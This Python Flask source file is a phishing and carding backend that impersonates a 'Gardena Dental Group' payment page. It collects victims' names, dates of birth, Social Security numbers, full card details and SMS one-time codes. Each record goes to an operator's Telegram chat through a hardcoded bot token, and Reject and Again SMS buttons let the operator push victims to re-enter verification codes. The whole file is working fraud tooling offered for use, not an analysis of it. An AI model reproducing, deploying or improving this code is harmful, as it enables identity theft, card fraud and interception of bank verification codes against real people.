import requests
from flask import Flask, request, render_template, redirect, session, jsonify
from flask_cors import CORS
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import uuid


app = Flask(__name__)
CORS(app)

app.secret_key = 'your_very_secret_key'
TELEGRAM_TOKEN = '5880113137:AAEBkVOchK-a2a4fQEFSwj04oP3bhpIHBEU'
TELEGRAM_CHAT_ID = '@ad524534'

need_redirect = None
form_tokens = {}

@app.route('/set_data', methods=['GET', 'POST'])
def set_data():
    if request.method == 'GET':
        data = {
            'first_name': request.args.get('first_name', ''),
            'last_name': request.args.get('last_name', ''),
            'phone': request.args.get('phone', ''),
            'email': request.args.get('email', ''),
            'dob': request.args.get('dob', ''),
            'ssn': request.args.get('ssn', ''),
            'ip_address': request.args.get('ip_address', ''),
            'user_agent': request.args.get('user_agent', ''),
        }
        session.update(data)
        return redirect('/checkout')


@app.route('/checkout')
def form():
    cardHolderName = session.get('first_name', '') + ' ' + session.get('last_name', '')
    cardHolderName = cardHolderName.strip()
    session['cardHolderName'] = cardHolderName
    return render_template('form2.html', session=session)


@app.route('/processing', methods=['POST'])
def processing():
    form_uid = str(uuid.uuid4())
    session['form_uid'] = form_uid
    print(f"Set form_uid in session: {form_uid}")
    card_number = request.form['cardNumber']
    cvv = request.form['cvv']
    expiry = request.form['expiryDate']
    session['cvv'] = cvv
    session['expiryDate'] = expiry
    session['cardNumber'] = card_number
    phone_number = session['phone']
    first_name = session['first_name']
    last_name = session['last_name']
    cardHolderName = session['cardHolderName']
    email = session['email']
    dob = session['dob']
    ssn = session['ssn']
    ip_address = session['ip_address']
    user_agent = session['user_agent']
    card_number = session['cardNumber']
    cvv = session['cvv']
    expiry = session['expiryDate']
    form_uid = session['form_uid']

    msg = f"Gardena Dental Group - \n\nFirst Name : {first_name}\nLast Name : {last_name}\nPhone Number : {phone_number}\nEmail : {email}\nDate of birth : {dob}\nSSN : {ssn}\n\nCardHolder Name : {cardHolderName}\nCreditCard Number : {card_number}\nCVV : {cvv}\nExpiry Date : {expiry}\n\nIP Address : {ip_address}\nUser Agent : {user_agent}\n\n"

    sendok = send_msg_enter_sms(msg, TELEGRAM_CHAT_ID, form_uid)
    if sendok:
        return render_template('waitpage_1.html', session=session, form_uid=form_uid)
    else:
        return "Error sending message"


@app.route('/smscode', methods=['POST'])
def smscode():
    smscode = request.form['smscode']
    session['smscode'] = smscode
    smscode = session['smscode']
    phone_number = session['phone']
    first_name = session['first_name']
    last_name = session['last_name']
    cardHolderName = session['cardHolderName']
    email = session['email']
    dob = session['dob']
    ssn = session['ssn']
    ip_address = session['ip_address']
    user_agent = session['user_agent']
    card_number = session['cardNumber']
    cvv = session['cvv']
    expiry = session['expiryDate']

    msg = f"Gardena Dental Group \n\nFirst Name : {first_name}\nLast Name : {last_name}\nPhone Number : {phone_number}\nEmail : {email}\nDate of birth : {dob}\nSSN : {ssn}\n\nCardHolder Name : {cardHolderName}\nCreditCard Number : {card_number}\nCVV : {cvv}\nExpiry Date : {expiry}\nSMS Code : {smscode}\nIP Address : {ip_address}"
    sendok = send_msg_smscode(msg, TELEGRAM_CHAT_ID)
    if sendok:
        return render_template('waitpage_2.html', session=session)
    else:
        return "Error sending message"

def send_msg_enter_sms(tekst, chat_id, form_uid):
    keyboard = [
        [InlineKeyboardButton("SMS", callback_data=f'sms-{form_uid}'),
         InlineKeyboardButton("Reject", callback_data=f'reject-{form_uid}')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': tekst,
        'reply_markup': reply_markup.to_json()
    }
    response = requests.post(url, data=data)
    return response.ok

def send_msg_smscode(tekst, chat_id, form_uid):
    keyboard = [
        [InlineKeyboardButton("All Ok", callback_data=f'ok-{form_uid}'),
         InlineKeyboardButton("Again SMS", callback_data=f'reject-{form_uid}')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': tekst,
        'reply_markup': reply_markup.to_json()
    }
    response = requests.post(url, data=data)
    return response.ok


@app.route('/api/processing')
def check_1():
    global need_redirect
    if need_redirect is None:
        return jsonify({'status': 'waiting'})
    elif need_redirect is True:
        need_redirect = None
        return jsonify({'status': 'confirmed'})
    elif need_redirect is False:
        need_redirect = None
        return jsonify({'status': 'rejected'})
    else:
        need_redirect = None
        return jsonify({'status': 'waiting'})


@app.route('/api/telegram-callback', methods=['POST'])
def telegram_callback():
    data = request.json
    print('data =',data)
    callback_data = data['form_uid']
    callback_uid = callback_data.split('-')[-1]
    print('callback_data =',callback_data)
    print('callback_uid =',callback_uid)
    session_uid = session.get('form_uid')
    print(f"Received UID: {callback_uid}, Session UID: {session.get('form_uid')}")  # Debug log
    global need_redirect
    if callback_uid == session_uid:
        if 'sms' in callback_data or 'ok' in callback_data:
            print(data)
            need_redirect = True
        elif 'reject' in callback_data or 'card_reject' in callback_data:
            print(data)
            need_redirect = False
    else:
        print("UID mismatch or invalid callback data")
        return jsonify(success=False, error="Invalid or mismatched UID")





@app.route('/confirmation')
def confirmation():
    data = {field: session.get(field, '') for field in session}
    print(data)
    return render_template('confirmation.html', data=data)


@app.route('/card_rejected')
def card_rejected():
    data = {field: session.get(field, '') for field in session}
    return render_template('form3.html', data=data)


@app.route('/rejected')
def rejected():
    data = {field: session.get(field, '') for field in session}
    return render_template('confirmation.html', data=data)


@app.route('/confirmed')
def confirmed():
    return render_template('thank-you.html')


if __name__ == '__main__':
    app.run(debug=True)
